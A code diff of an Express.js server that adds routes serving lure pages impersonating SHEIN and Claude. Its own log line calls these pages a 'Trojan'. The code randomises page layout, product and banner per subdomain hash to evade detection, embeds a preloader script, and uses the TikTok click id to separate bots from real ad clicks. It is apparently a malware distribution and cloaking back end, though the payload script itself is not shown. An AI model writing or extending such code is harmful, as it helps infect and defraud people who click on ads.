@@ -944,6 +944,8 @@ const xorEncrypt = (str, key) => {
     return result;
 };
 
+// SHEIN ESPANOL
+
 // SHEIN V3
 app.get('/sheinv3/:slug', (req, res, next) => {
     const { offer, slug } = req.params;
@@ -2927,6 +2929,24 @@ app.get('/claude', extractSubdomain, (req, res, next) => {
     const slug = req.subdomain;
     const hash = generateHash(slug);
     const preloader = "preloader.js";
+    let ttclid = req.query.ttclid || 'BOT';
+    if (ttclid !== 'BOT') {
+        ttclid = ttclid.slice(0, 5);
+    }
+    console.log(`Served CLAUDE Trojan (${slug})::(${ttclid})`);
+    const layout = selectFromArray(layouts, parseInt(hash.substr(0, 8), 16));
+    const product = selectFromArray(products, parseInt(hash.substr(8, 8), 16));
+    const banner = selectFromArray(banners, parseInt(hash.substr(16, 8), 16));
+    const backgroundColor = generateColor(hash);
+    const html = layout.generateHTML(slug, product, banner, backgroundColor, hash, preloader);
+    res.send(html);
+});
+
+// SHEIN ESPANOL
+app.get('/esp', extractSubdomain, (req, res, next) => {
+    const slug = req.subdomain;
+    const hash = generateHash(slug);
+    const preloader = "preloaderESP.js";
     let ttclid = req.query.ttclid || 'BOT';
     if (ttclid !== 'BOT') {
         ttclid = ttclid.slice(0, 5);
